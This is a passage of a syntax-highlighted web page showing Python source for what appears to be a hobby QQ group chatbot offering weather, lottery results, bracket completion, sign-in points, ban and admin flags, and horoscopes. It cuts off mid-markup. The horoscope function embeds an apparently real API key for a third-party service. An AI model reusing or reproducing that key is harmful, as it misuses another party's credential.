class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#api.py</span><span class="token keyword">import</span> person<span class="token keyword">import</span> group<span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">import</span> time<span class="token keyword">import</span> json<span class="token keyword">import</span> random<span class="token keyword">def</span> <span class="token function">help</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"天气：输入天气 地名，获取当地天气，默认为徐州天气\n双色球：输入双色球查看最新一期双色球开奖信息以及奖池累计金额\n扔瓶子：私聊罗伯特并发送以下内容：\n扔瓶子 发送者（可填匿名） 接受者（可填空） 内容\n来扔瓶子\n捞瓶子：发送捞瓶子来捞别人扔的瓶子\n帮助：输入/help，获取帮助"</span><span class="token keyword">def</span> <span class="token function">weather</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        city<span class="token operator">=</span>message<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        city<span class="token operator">=</span><span class="token string">'徐州'</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        ercode<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">'http://wthrcdn.etouch.cn/weather_mini?city='</span><span class="token operator">+</span>city<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"罗伯特被学校关起来了呜呜"</span>    <span class="token keyword">if</span> <span class="token string">"invilad-citykey"</span> <span class="token keyword">in</span> ercode<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"抱歉，您的输入有误，请检查后再试"</span>    weatherInfo<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">'http://wthrcdn.etouch.cn/weather_mini?city='</span><span class="token operator">+</span>city<span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'forecast'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    ganmao<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">'http://wthrcdn.etouch.cn/weather_mini?city='</span><span class="token operator">+</span>city<span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'ganmao'</span><span class="token punctuation">]</span>    fl<span class="token operator">=</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"[0-9]+"</span><span class="token punctuation">,</span>weatherInfo<span class="token punctuation">[</span><span class="token string">'fengli'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    hi<span class="token operator">=</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"[0-9]+"</span><span class="token punctuation">,</span>weatherInfo<span class="token punctuation">[</span><span class="token string">'high'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    lo<span class="token operator">=</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"[0-9]+"</span><span class="token punctuation">,</span>weatherInfo<span class="token punctuation">[</span><span class="token string">'low'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    weatherInfo<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"今日</span><span class="token interpolation"><span class="token punctuation">&#123;</span>city<span class="token punctuation">&#125;</span></span><span class="token string">天气</span><span class="token interpolation"><span class="token punctuation">&#123;</span>weatherInfo<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">，最高温度</span><span class="token interpolation"><span class="token punctuation">&#123;</span>hi<span class="token punctuation">&#125;</span></span><span class="token string">℃，最低温度</span><span class="token interpolation"><span class="token punctuation">&#123;</span>lo<span class="token punctuation">&#125;</span></span><span class="token string">℃，</span><span class="token interpolation"><span class="token punctuation">&#123;</span>weatherInfo<span class="token punctuation">[</span><span class="token string">'fengxiang'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>fl<span class="token punctuation">&#125;</span></span><span class="token string">级\n温馨提示，</span><span class="token interpolation"><span class="token punctuation">&#123;</span>ganmao<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token keyword">return</span> weatherInfo<span class="token keyword">def</span> <span class="token function">buquan</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span>uid<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#计算括号数量并自动补全</span>    <span class="token keyword">def</span> <span class="token function">countBracket</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>        countban<span class="token operator">=</span><span class="token number">0</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> message<span class="token punctuation">:</span>            <span class="token keyword">if</span> i<span class="token operator">==</span><span class="token string">'('</span><span class="token punctuation">:</span>                countban<span class="token operator">+=</span><span class="token number">1</span>            <span class="token keyword">if</span> i<span class="token operator">==</span><span class="token string">')'</span><span class="token punctuation">:</span>                countban<span class="token operator">-=</span><span class="token number">1</span>        countquan<span class="token operator">=</span><span class="token number">0</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> message<span class="token punctuation">:</span>            <span class="token keyword">if</span> i<span class="token operator">==</span><span class="token string">'（'</span><span class="token punctuation">:</span>                countquan<span class="token operator">+=</span><span class="token number">1</span>            <span class="token keyword">if</span> i<span class="token operator">==</span><span class="token string">'）'</span><span class="token punctuation">:</span>                countquan<span class="token operator">-=</span><span class="token number">1</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'ban'</span><span class="token punctuation">:</span>countban<span class="token punctuation">,</span><span class="token string">'quan'</span><span class="token punctuation">:</span>countquan<span class="token punctuation">&#125;</span>    <span class="token comment">#自动补全括号</span>    ban<span class="token operator">=</span>countBracket<span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'ban'</span><span class="token punctuation">]</span>    quan<span class="token operator">=</span>countBracket<span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'quan'</span><span class="token punctuation">]</span>    bu<span class="token operator">=</span><span class="token string">""</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token punctuation">(</span>ban <span class="token keyword">or</span> quan<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span>    <span class="token keyword">if</span> ban<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>ban<span class="token punctuation">)</span><span class="token punctuation">:</span>            bu<span class="token operator">+=</span><span class="token string">')'</span>    <span class="token keyword">elif</span> ban<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token operator">-</span>ban<span class="token punctuation">)</span><span class="token punctuation">:</span>            bu<span class="token operator">+=</span><span class="token string">'('</span>    <span class="token keyword">if</span> quan<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>quan<span class="token punctuation">)</span><span class="token punctuation">:</span>            bu<span class="token operator">+=</span><span class="token string">'）'</span>    <span class="token keyword">elif</span> quan<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token operator">-</span>quan<span class="token punctuation">)</span><span class="token punctuation">:</span>            bu<span class="token operator">+=</span><span class="token string">'（'</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>bu<span class="token operator">+</span><span class="token string-interpolation"><span class="token string">f"[CQ:at,qq=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>uid<span class="token punctuation">&#125;</span></span><span class="token string">]帮你补括号"</span></span><span class="token punctuation">)</span>    <span class="token keyword">return</span> bu<span class="token operator">+</span><span class="token string-interpolation"><span class="token string">f"[CQ:at,qq=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>uid<span class="token punctuation">&#125;</span></span><span class="token string">]帮你补括号"</span></span><span class="token keyword">def</span> <span class="token function">theDoubleChromosphere</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">:</span>    tex<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://www.cwl.gov.cn/fcpz/yxjs/ssq/"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text    <span class="token comment">#获取红球</span>    red<span class="token operator">=</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"&lt;div class=\"ssqRed-dom\">\[(.*?)\]&lt;/div>"</span><span class="token punctuation">,</span>tex<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    red<span class="token operator">=</span>red<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span>    <span class="token comment">#获取蓝球</span>    blue<span class="token operator">=</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"&lt;div class=\"ssqBlue-dom\">\[(.*?)\]&lt;/div>"</span><span class="token punctuation">,</span>tex<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    blue<span class="token operator">=</span>blue<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span>    <span class="token comment">#获取期号</span>    qh<span class="token operator">=</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"&lt;div class=\"ssqQh-dom\">(.*?)&lt;/div>"</span><span class="token punctuation">,</span>tex<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment">#获取奖池</span>    pool<span class="token operator">=</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"&lt;div class=\"ssqPool-dom\">(.*?)&lt;/div>"</span><span class="token punctuation">,</span>tex<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"第</span><span class="token interpolation"><span class="token punctuation">&#123;</span>qh<span class="token punctuation">&#125;</span></span><span class="token string">期开奖结果为：\n红球：</span><span class="token interpolation"><span class="token punctuation">&#123;</span>red<span class="token punctuation">&#125;</span></span><span class="token string">\n蓝球：</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blue<span class="token punctuation">&#125;</span></span><span class="token string">\n奖池：</span><span class="token interpolation"><span class="token punctuation">&#123;</span>pool<span class="token punctuation">&#125;</span></span><span class="token string">\n[CQ:at,qq=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>uid<span class="token punctuation">&#125;</span></span><span class="token string">]害搁着等着干啥呢，赶紧买彩票去啊"</span></span><span class="token keyword">def</span> <span class="token function">sign</span><span class="token punctuation">(</span>gid<span class="token punctuation">,</span>uid<span class="token punctuation">,</span>nick<span class="token punctuation">)</span><span class="token punctuation">:</span>    today<span class="token operator">=</span>time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%Y-%m-%d"</span><span class="token punctuation">,</span>time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    groupUserInfo<span class="token operator">=</span>group<span class="token punctuation">.</span>readGroupUserInfo<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        thisGroupUserInfo<span class="token operator">=</span>groupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>gid<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        thisGroupUserInfo<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        thisGroupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"nick"</span><span class="token punctuation">:</span> nick<span class="token punctuation">,</span> <span class="token string">"point"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"signTime"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"ban"</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">&#125;</span>    groupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>gid<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span>thisGroupUserInfo    <span class="token keyword">try</span><span class="token punctuation">:</span>        thisUser<span class="token operator">=</span>thisGroupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        thisUser<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"nick"</span><span class="token punctuation">:</span> nick<span class="token punctuation">,</span> <span class="token string">"point"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"signTime"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"ban"</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">&#125;</span>        thisGroupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span>thisUser    <span class="token keyword">if</span> thisUser<span class="token punctuation">[</span><span class="token string">'signTime'</span><span class="token punctuation">]</span><span class="token operator">==</span>today<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"[CQ:at,qq=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>uid<span class="token punctuation">&#125;</span></span><span class="token string">]您今天已经签到过了，明天再来吧"</span></span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        thisUser<span class="token punctuation">[</span><span class="token string">'point'</span><span class="token punctuation">]</span><span class="token operator">+=</span><span class="token number">1</span>        thisUser<span class="token punctuation">[</span><span class="token string">'signTime'</span><span class="token punctuation">]</span><span class="token operator">=</span>today        group<span class="token punctuation">.</span>saveGroupUserInfo<span class="token punctuation">(</span>groupUserInfo<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"[CQ:at,qq=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>uid<span class="token punctuation">&#125;</span></span><span class="token string">]签到成功，您的积分为</span><span class="token interpolation"><span class="token punctuation">&#123;</span>thisUser<span class="token punctuation">[</span><span class="token string">'point'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">，明天再来吧"</span></span><span class="token keyword">def</span> <span class="token function">getQQ</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        qq<span class="token operator">=</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"qq=(\d+)"</span><span class="token punctuation">,</span>message<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        qq<span class="token operator">=</span><span class="token boolean">None</span>    <span class="token keyword">return</span> qq<span class="token keyword">def</span> <span class="token function">ban</span><span class="token punctuation">(</span>gid<span class="token punctuation">,</span>uid<span class="token punctuation">)</span><span class="token punctuation">:</span>    groupUserInfo<span class="token operator">=</span>group<span class="token punctuation">.</span>readGroupUserInfo<span class="token punctuation">(</span><span class="token punctuation">)</span>    thisGroupUserInfo<span class="token operator">=</span>groupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>gid<span class="token punctuation">)</span><span class="token punctuation">]</span>    thisUser<span class="token operator">=</span>thisGroupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">]</span>    thisUser<span class="token punctuation">[</span><span class="token string">'ban'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">True</span>    groupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>gid<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span>thisGroupUserInfo    group<span class="token punctuation">.</span>saveGroupUserInfo<span class="token punctuation">(</span>groupUserInfo<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"好，我们不和[CQ:at,qq=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>uid<span class="token punctuation">&#125;</span></span><span class="token string">]玩"</span></span><span class="token keyword">def</span> <span class="token function">unban</span><span class="token punctuation">(</span>gid<span class="token punctuation">,</span>uid<span class="token punctuation">)</span><span class="token punctuation">:</span>    groupUserInfo<span class="token operator">=</span>group<span class="token punctuation">.</span>readGroupUserInfo<span class="token punctuation">(</span><span class="token punctuation">)</span>    thisGroupUserInfo<span class="token operator">=</span>groupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>gid<span class="token punctuation">)</span><span class="token punctuation">]</span>    thisUser<span class="token operator">=</span>thisGroupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">]</span>    thisUser<span class="token punctuation">[</span><span class="token string">'ban'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">False</span>    groupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>gid<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span>thisGroupUserInfo    group<span class="token punctuation">.</span>saveGroupUserInfo<span class="token punctuation">(</span>groupUserInfo<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"好吧，我原谅你了[CQ:at,qq=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>uid<span class="token punctuation">&#125;</span></span><span class="token string">]"</span></span><span class="token keyword">def</span> <span class="token function">keywordForPerson</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span> uid<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> message<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'天气'</span><span class="token punctuation">:</span>        person<span class="token punctuation">.</span>sendMessage<span class="token punctuation">(</span>weather<span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">,</span>uid<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">isBan</span><span class="token punctuation">(</span>gid<span class="token punctuation">,</span>uid<span class="token punctuation">)</span><span class="token punctuation">:</span>    groupUserInfo<span class="token operator">=</span>group<span class="token punctuation">.</span>readGroupUserInfo<span class="token punctuation">(</span><span class="token punctuation">)</span>    thisGroupUserInfo<span class="token operator">=</span>groupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>gid<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        thisUser<span class="token operator">=</span>thisGroupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> thisUser<span class="token punctuation">[</span><span class="token string">'ban'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">point</span><span class="token punctuation">(</span>gid<span class="token punctuation">,</span>uid<span class="token punctuation">)</span><span class="token punctuation">:</span>    groupUserInfo<span class="token operator">=</span>group<span class="token punctuation">.</span>readGroupUserInfo<span class="token punctuation">(</span><span class="token punctuation">)</span>    thisGroupUserInfo<span class="token operator">=</span>groupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>gid<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        thisUser<span class="token operator">=</span>thisGroupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"[CQ:at,qq=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>uid<span class="token punctuation">&#125;</span></span><span class="token string">]您的积分为</span><span class="token interpolation"><span class="token punctuation">&#123;</span>thisUser<span class="token punctuation">[</span><span class="token string">'point'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"[CQ:at,qq=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>uid<span class="token punctuation">&#125;</span></span><span class="token string">]请先签到后重试"</span></span><span class="token keyword">def</span> <span class="token function">isAdmin</span><span class="token punctuation">(</span>gid<span class="token punctuation">,</span>uid<span class="token punctuation">)</span><span class="token punctuation">:</span>    groupUserInfo<span class="token operator">=</span>group<span class="token punctuation">.</span>readGroupUserInfo<span class="token punctuation">(</span><span class="token punctuation">)</span>    thisGroupUserInfo<span class="token operator">=</span>groupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>gid<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        thisUser<span class="token operator">=</span>thisGroupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> thisUser<span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">giveAdmin</span><span class="token punctuation">(</span>gid<span class="token punctuation">,</span>uid<span class="token punctuation">)</span><span class="token punctuation">:</span>    groupUserInfo<span class="token operator">=</span>group<span class="token punctuation">.</span>readGroupUserInfo<span class="token punctuation">(</span><span class="token punctuation">)</span>    thisGroupUserInfo<span class="token operator">=</span>groupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>gid<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        thisUser<span class="token operator">=</span>thisGroupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        thisUser<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"nick"</span><span class="token punctuation">:</span> <span class="token string">"nick"</span><span class="token punctuation">,</span> <span class="token string">"point"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"signTime"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"ban"</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">&#125;</span>    thisUser<span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">True</span>    thisGroupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span>thisUser    groupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>gid<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span>thisGroupUserInfo    group<span class="token punctuation">.</span>saveGroupUserInfo<span class="token punctuation">(</span>groupUserInfo<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"没问题，以后我就听你的啦[CQ:at,qq=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>uid<span class="token punctuation">&#125;</span></span><span class="token string">]"</span></span><span class="token keyword">def</span> <span class="token function">today</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        message<span class="token operator">=</span>message<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>        message<span class="token operator">=</span>message<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        message<span class="token operator">=</span><span class="token boolean">None</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"请输入运势 星座来查询今日运势"</span></span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">:</span>        message<span class="token operator">=</span>message<span class="token operator">+</span><span class="token string">"座"</span>    url<span class="token operator">=</span><span class="token string">"http://web.juhe.cn:8080/constellation/getAll"</span>    params<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token string">"key"</span><span class="token punctuation">:</span><span class="token string">"4a11bbcbf089edaf14c2d9bdb80c2ec4"</span><span class="token punctuation">,</span>        <span class="token string">"consName"</span><span class="token punctuation">:</span>message<span class="token punctuation">,</span>        <span class="token string">"type"</span><span class="token punctuation">:</span><span class="token string">"today"</span>    <span class="token punctuation">&#125;</span>    ys<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>params<span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>ys<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">今日运势：\n综合指数：</span><span class="token interpolation"><span class="token punctuation">&#123;</span>ys<span class="token punctuation">[</span><span class="token string">'all'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">%\n幸运色：</span><span class="token interpolation"><span class="token punctuation">&#123;</span>ys<span class="token punctuation">[</span><span class="token string">'color'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">\n健康指数：</span><span class="token interpolation"><span class="token punctuation">&#123;</span>ys<span class="token punctuation">[</span><span class="token string">'health'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">%\n爱情指数：</span><span class="token interpolation"><span class="token punctuation">&#123;</span>ys<span class="token punctuation">[</span><span class="token string">'love'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">%\n财运指数：</span><span class="token interpolation"><span class="token punctuation">&#123;</span>ys<span class="token punctuation">[</span><span class="token string">'money'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">%\n工作指数：</span><span class="token interpolation"><span class="token punctuation">&#123;</span>ys<span class="token punctuation">[</span><span class="token string">'work'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">%\n幸运数字：</span><span class="token interpolation"><span class="token punctuation">&#123;</span>ys<span class="token punctuation">[</span><span class="token string">'number'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">\n适配星座：</span><span class="token interpolation"><span class="token punctuation">&#123;</span>ys<span class="token punctuation">[</span><span 